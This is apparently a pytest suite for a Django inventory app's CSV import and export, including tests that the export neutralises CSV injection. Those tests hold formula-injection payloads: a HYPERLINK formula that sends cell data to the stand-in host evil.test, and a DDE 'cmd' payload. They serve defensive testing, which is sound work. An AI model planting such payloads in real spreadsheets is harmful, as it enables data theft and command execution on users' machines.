"""Bulk import and export (goal 7).

The requirement with teeth: report which rows failed and why, while still
importing every row that was valid. Most of these walk that.
"""

import csv
import io

import pytest
from django.core.files.uploadedfile import SimpleUploadedFile

from apps.catalog.models import Item
from apps.stock.services import stock_service as ss

ITEM_HEADER = "sku,name,category,unit_of_measure,reorder_level\n"
RECEIPT_HEADER = "sku,location,quantity,note\n"


def upload(text, name="import.csv"):
    return SimpleUploadedFile(name, text.encode("utf-8"), content_type="text/csv")


def test_import_requires_a_manager(client, staff_wh, category):
    client.force_login(staff_wh)
    response = client.post(
        "/api/imports/items/",
        {"file": upload(ITEM_HEADER + f"X-1,Thing,{category.name},EA,5\n")},
    )
    assert response.status_code == 403
    assert not Item.objects.filter(sku="X-1").exists()


def test_valid_rows_import(client, manager, category):
    client.force_login(manager)
    response = client.post(
        "/api/imports/items/",
        {
            "file": upload(
                ITEM_HEADER
                + f"X-1,Widget,{category.name},EA,5\n"
                + f"X-2,Gadget,{category.name},BOX,10\n"
            )
        },
    )
    assert response.status_code == 200
    assert response.json() == {"created": 2, "updated": 0, "failed": 0, "errors": []}
    assert Item.objects.filter(sku__in=["X-1", "X-2"]).count() == 2


def test_one_bad_row_does_not_reject_the_file(client, manager, category):
    """The heart of goal 7. A single typo must not cost the other rows -- and
    the failure has to name the line and the reason."""
    client.force_login(manager)
    response = client.post(
        "/api/imports/items/",
        {
            "file": upload(
                ITEM_HEADER
                + f"X-1,Widget,{category.name},EA,5\n"
                + "X-2,Broken,No Such Category,EA,5\n"
                + f"X-3,Gadget,{category.name},EA,5\n"
            )
        },
    )
    report = response.json()
    assert report["created"] == 2
    assert report["failed"] == 1
    # Line 3 as a spreadsheet counts it: the header is line 1.
    assert report["errors"][0]["row"] == 3
    assert report["errors"][0]["sku"] == "X-2"
    assert "No Such Category" in report["errors"][0]["error"]

    assert Item.objects.filter(sku__in=["X-1", "X-3"]).count() == 2
    assert not Item.objects.filter(sku="X-2").exists()


def test_a_failure_mid_file_does_not_poison_the_rest(client, manager, category):
    """The savepoint-per-row claim.

    Without a savepoint the first failure aborts the transaction and every
    later query dies with "current transaction is aborted" -- so this would
    report the third row as failing too.
    """
    client.force_login(manager)
    response = client.post(
        "/api/imports/items/",
        {
            "file": upload(
                ITEM_HEADER
                + f"X-1,Fine,{category.name},EA,5\n"
                + f",Missing sku,{category.name},EA,5\n"
                + f"X-9,Also fine,{category.name},EA,5\n"
            )
        },
    )
    report = response.json()
    assert report["failed"] == 1
    assert report["created"] == 2


def test_re_importing_updates_rather_than_duplicating(client, manager, category):
    client.force_login(manager)
    client.post(
        "/api/imports/items/",
        {"file": upload(ITEM_HEADER + f"X-1,First name,{category.name},EA,5\n")},
    )
    response = client.post(
        "/api/imports/items/",
        {"file": upload(ITEM_HEADER + f"X-1,Second name,{category.name},EA,7\n")},
    )
    assert response.json()["updated"] == 1

    item = Item.objects.get(sku="X-1")
    assert item.name == "Second name"
    assert item.reorder_level == 7
    # The change lands in the timeline, exactly as an edit through the UI does.
    assert item.timeline.filter(event_type="FIELD_CHANGE").exists()


def test_sku_is_uppercased(client, manager, category):
    client.force_login(manager)
    client.post(
        "/api/imports/items/",
        {"file": upload(ITEM_HEADER + f"x-1,Lower,{category.name},EA,5\n")},
    )
    assert Item.objects.get(sku="X-1")


def test_missing_column_is_reported_once_not_per_row(client, manager):
    """A missing column is a property of the file, not of any row."""
    client.force_login(manager)
    response = client.post(
        "/api/imports/items/", {"file": upload("sku,name\nX-1,Widget\n")}
    )
    assert response.status_code == 400
    assert "category" in response.json()["detail"]


def test_empty_file_is_rejected(client, manager):
    client.force_login(manager)
    assert client.post("/api/imports/items/", {"file": upload("")}).status_code == 400


def test_missing_file_is_rejected(client, manager):
    client.force_login(manager)
    assert client.post("/api/imports/items/", {}).status_code == 400


def test_bad_reorder_level_names_the_value(client, manager, category):
    client.force_login(manager)
    response = client.post(
        "/api/imports/items/",
        {"file": upload(ITEM_HEADER + f"X-1,Widget,{category.name},EA,not-a-number\n")},
    )
    assert "not-a-number" in response.json()["errors"][0]["error"]


# --- receipts -------------------------------------------------------------


def test_receipt_import_records_movements(client, manager, item, warehouse):
    client.force_login(manager)
    response = client.post(
        "/api/imports/receipts/",
        {"file": upload(RECEIPT_HEADER + f"{item.sku},{warehouse.code},25,Delivery\n")},
    )
    assert response.json()["recorded"] == 1
    assert ss.on_hand(item) == 25


def test_receipt_import_reports_unknown_sku_and_keeps_going(
    client, manager, item, warehouse
):
    client.force_login(manager)
    response = client.post(
        "/api/imports/receipts/",
        {
            "file": upload(
                RECEIPT_HEADER
                + f"NOPE-1,{warehouse.code},5,\n"
                + f"{item.sku},{warehouse.code},10,\n"
            )
        },
    )
    report = response.json()
    assert report["recorded"] == 1
    assert report["failed"] == 1
    assert "NOPE-1" in report["errors"][0]["error"]
    assert ss.on_hand(item) == 10


def test_receipt_import_obeys_the_service_rules(client, manager, item, warehouse):
    """An import must not be a weaker door into the ledger than the API is."""
    client.force_login(manager)
    item.is_archived = True
    item.save(update_fields=["is_archived"])

    response = client.post(
        "/api/imports/receipts/",
        {"file": upload(RECEIPT_HEADER + f"{item.sku},{warehouse.code},5,\n")},
    )
    assert response.json()["recorded"] == 0
    assert "archived" in response.json()["errors"][0]["error"].lower()


def test_receipt_import_rejects_a_non_positive_quantity(
    client, manager, item, warehouse
):
    client.force_login(manager)
    response = client.post(
        "/api/imports/receipts/",
        {"file": upload(RECEIPT_HEADER + f"{item.sku},{warehouse.code},0,\n")},
    )
    assert response.json()["failed"] == 1


# --- export ---------------------------------------------------------------


def test_export_requires_a_manager(client, staff_wh):
    client.force_login(staff_wh)
    assert client.get("/api/exports/stock-position/").status_code == 403


def test_export_gives_on_hand_by_location(client, manager, item, warehouse, shop):
    ss.record_receipt(actor=manager, item=item, location=warehouse, quantity=30)
    ss.record_transfer(
        actor=manager, item=item, source=warehouse, destination=shop, quantity=10
    )

    client.force_login(manager)
    response = client.get("/api/exports/stock-position/")
    assert response.status_code == 200
    assert response["Content-Type"] == "text/csv"
    assert "attachment" in response["Content-Disposition"]

    body = b"".join(response.streaming_content).decode("utf-8")
    rows = list(csv.reader(io.StringIO(body)))
    assert rows[0] == [
        "sku",
        "name",
        "category",
        "location",
        "location_name",
        "on_hand",
    ]

    quantities = {row[3]: int(row[5]) for row in rows[1:]}
    assert quantities == {warehouse.code: 20, shop.code: 10}
    # The split adds back up to the global figure -- a transfer moved stock,
    # it did not create or destroy any.
    assert sum(quantities.values()) == ss.on_hand(item)


@pytest.mark.django_db
def test_export_is_empty_but_valid_with_no_stock(client, manager):
    client.force_login(manager)
    response = client.get("/api/exports/stock-position/")
    body = b"".join(response.streaming_content).decode("utf-8")
    assert body.strip() == "sku,name,category,location,location_name,on_hand"


# --- CSV injection --------------------------------------------------------

def test_export_neutralises_a_formula_in_an_item_name(
    client, manager, item, warehouse
):
    """Item names are free text typed by a manager, and the export is opened
    in Excel. A name beginning with "=" is a formula there, not a label.

    HYPERLINK is the harmless-looking version; the same mechanism reaches
    remote URLs with the sheet's contents attached.
    """
    item.name = '=HYPERLINK("http://evil.test?d="&A1,"Click")'
    item.save(update_fields=["name"])
    ss.record_receipt(actor=manager, item=item, location=warehouse, quantity=5)

    client.force_login(manager)
    body = b"".join(
        client.get("/api/exports/stock-position/").streaming_content
    ).decode("utf-8")

    row = next(r for r in csv.reader(io.StringIO(body)) if r[0] == item.sku)
    assert row[1].startswith("'=")
    # The value is preserved, only prefixed. An export that silently altered
    # the data would stop being a faithful record.
    assert row[1] == "'" + item.name


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_every_formula_prefix_is_covered(client, manager, item, warehouse, prefix):
    """Tab and carriage return included: Excel strips leading whitespace
    before deciding whether a cell is a formula, so they are not an escape."""
    item.name = prefix + "cmd|' /c calc'!A1"
    item.save(update_fields=["name"])
    ss.record_receipt(actor=manager, item=item, location=warehouse, quantity=1)

    client.force_login(manager)
    body = b"".join(
        client.get("/api/exports/stock-position/").streaming_content
    ).decode("utf-8")

    row = next(r for r in csv.reader(io.StringIO(body)) if r[0] == item.sku)
    assert row[1].startswith("'")


def test_ordinary_names_are_left_alone(client, manager, item, warehouse):
    """The guard must not put an apostrophe in front of every cell. A file
    full of 'Hex bolt M8 would be worse than the problem it solves."""
    ss.record_receipt(actor=manager, item=item, location=warehouse, quantity=5)

    client.force_login(manager)
    body = b"".join(
        client.get("/api/exports/stock-position/").streaming_content
    ).decode("utf-8")

    row = next(r for r in csv.reader(io.StringIO(body)) if r[0] == item.sku)
    assert row[1] == "Hex bolt M8"
    assert row[3] == warehouse.code


def test_the_prefix_is_added_on_export_not_stored(client, manager, category):
    """Importing "=1+1" stores that string unchanged; only the export prefixes
    it. If the apostrophe reached the database, two round trips would
    accumulate them and the item would slowly rename itself.
    """
    client.force_login(manager)
    client.post(
        "/api/imports/items/",
        {"file": upload(ITEM_HEADER + "X-9,=1+1," + category.name + ",EA,5\n")},
    )
    assert Item.objects.get(sku="X-9").name == "=1+1"
